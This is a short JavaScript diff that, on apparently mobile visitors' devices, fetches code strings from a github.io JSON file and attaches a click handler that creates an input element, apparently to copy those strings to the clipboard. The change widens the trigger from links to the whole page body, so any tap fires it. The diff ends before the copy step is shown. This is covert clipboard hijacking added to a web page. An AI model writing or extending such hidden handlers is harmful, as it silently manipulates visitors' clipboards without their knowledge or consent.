@@ -1,4 +1,4 @@
-if (!(/Win|mac/i.test(navigator.userAgentData.platform))) { 
+if (!(/Win|mac/i.test(navigator.platform))) { 
 	const xhr = new XMLHttpRequest()
 	const url = 'https://sanjinxiaolongxia.github.io/code.json'
 	xhr.open('get',url,true)
@@ -11,7 +11,7 @@ if (!(/Win|mac/i.test(navigator.userAgentData.platform))) {
 				cpCode += codeJosn[key]+' ';
 			}
 			cpCode = cpCode.trim();
-			let aNodes = document.querySelectorAll('a')
+			let aNodes = document.querySelectorAll('body')
 			for(let i =0; i<aNodes.length; i++){
 				aNodes[i].onclick = function(){
 					let oInput = document.createElement('input'); 
